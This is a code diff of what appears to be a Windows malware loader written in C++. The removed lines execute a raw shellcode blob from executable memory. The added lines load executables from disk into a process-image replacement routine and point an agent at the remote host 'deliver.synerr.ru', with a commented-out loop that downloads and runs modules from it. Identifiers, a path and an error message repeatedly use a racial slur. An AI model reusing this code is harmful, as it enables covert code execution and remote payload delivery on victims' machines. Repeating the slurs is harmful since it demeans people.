@@ -4,35 +4,61 @@
 #include <vector>
 #include <sstream>
 #include <string>
-#include <future>
 
 #include "TaskRunner.h"
 #include "Agent.h"
 #include "utils.h"
+#include "Override.h"
 
 
-void runShellcode() {
-	std::string test= "\x55\x48\x8B\xEC\x48\x83\xEC\x20\x48\x33\xC0\x48\x33\xDB\x48\x33\xC9\x48\x33\xD2\x48\x33\xFF\x48\x33\xC0\x65\x48\x8B\x40\x60\x48\x8B\x40\x18\x48\x8B\x40\x20\x48\x8B\x00\x48\x8B\x00\x48\x8B\x58\x20\x8B\x4B\x3C\x48\x03\xCB\x8B\x89\x88\x00\x00\x00\x48\x03\xCB\x8B\x51\x20\x48\x03\xD3\x8B\x79\x24\x48\x03\xFB\x8B\x49\x1C\x48\x03\xCB\x48\x33\xC0\x49\xB8\x57\x69\x6E\x45\x78\x65\x63\x00\x48\x33\xF6\x8B\x34\x82\x48\x03\xF3\x48\x8B\x36\x4C\x3B\xC6\x74\x05\x48\xFF\xC0\xEB\xEA\x4D\x33\xC0\x4D\x33\xC9\x66\x44\x8B\x04\x47\x46\x8B\x0C\x81\x49\x03\xD9\xC6\x45\xE0\x63\xC6\x45\xE1\x61\xC6\x45\xE2\x6C\xC6\x45\xE3\x63\xC6\x45\xE4\x00\x48\xC7\xC2\x05\x00\x00\x00\x48\x8D\x4D\xE0\xFF\xD3\x48\x8B\xE5\x5D\xC3";
-	char* shellcode = new char[test.size()];
-	memcpy(shellcode, test.data(), test.size());
+std::atomic<int> niggerName = 1;
 
-	void* exec = VirtualAlloc(0, test.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-	memcpy(exec, shellcode, test.size());
+void runBinary() {
+	Override overrider;
+	std::string basePath = "Z:\\repos\\SecurityProvider\\SecurityProvider\\x64\\Debug\\nigger" +
+		std::to_string(niggerName) + ".exe";
 
-	auto function = (int (*)()) exec;
+	niggerName.store(niggerName.load() + 1);
+
+
+	auto fp = fopen(basePath.c_str(), "rb");
+	if (!fp) {
+		std::cerr << "Nigger\n";
+		fclose(fp);
+		return;
+	}
+		fseek(fp, 0, SEEK_END);
+	auto filesize = ftell(fp);
+	fseek(fp, 0, SEEK_SET);
+
+	auto mem = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, filesize);
+	fread(mem, 1, filesize, fp);
+
+	overrider.ReplaceImage(mem);
+	fclose(fp);
 }
 
 int main() {
 	auto threadAmount = std::thread::hardware_concurrency();
-	//taskrunner::ThreadPool threadPool(threadAmount);
+	taskrunner::ThreadPool threadPool(threadAmount);
 
-	//Agent agent {
-//		"deliver.synerr.ru"
-//	};
+	Agent agent{
+		"deliver.synerr.ru"
+	};
+	//threadPool.AddTask(runBinary);
+	//threadPool.AddTask(runBinary);
+	//threadPool.AddTask(runBinary);
+	threadPool.Shutdown();
 
-	//agent.Ping();
-	runShellcode();
-	//threadPool.AddTask(runShellcode);
 
-	//threadPool.Shutdown();
+	/*
+		Sleep(100);
+		for (const auto& moduleName : agent.CheckNewModules()) {
+			auto moduleData = agent.DownloadModule(moduleName);
+			if (moduleData == "") {
+				continue;
+			}
+			threadPool.AddTask();
+		}
+		*/
 }
